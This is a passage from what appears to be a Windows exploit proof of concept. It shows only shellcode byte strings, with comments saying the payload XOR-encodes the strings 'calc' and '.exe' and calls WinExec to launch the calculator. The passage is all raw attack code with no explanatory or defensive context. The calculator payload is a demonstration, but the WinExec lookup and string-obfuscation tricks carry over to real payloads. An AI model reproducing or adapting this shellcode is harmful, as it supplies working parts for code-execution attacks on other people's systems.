...
shellcode += "\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
shellcode += "\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
shellcode += "\xB9\x04\x4F\x52\x4F\x81\xF1\x2A\x2A\x2A\x2A\x51" ###.exe : #mov ecx, 0x4f524f04 #xor ecx, 0x2A2A2A2A #push ecx
shellcode += "\xB9\x49\x4B\x46\x49\x81\xF1\x2A\x2A\x2A\x2A\x51\x31\xC9" ###calc : mov ecx, 0x49464b49 #xor ecx, 0x2A2A2A2A #push ecx #xor ecx,ecx
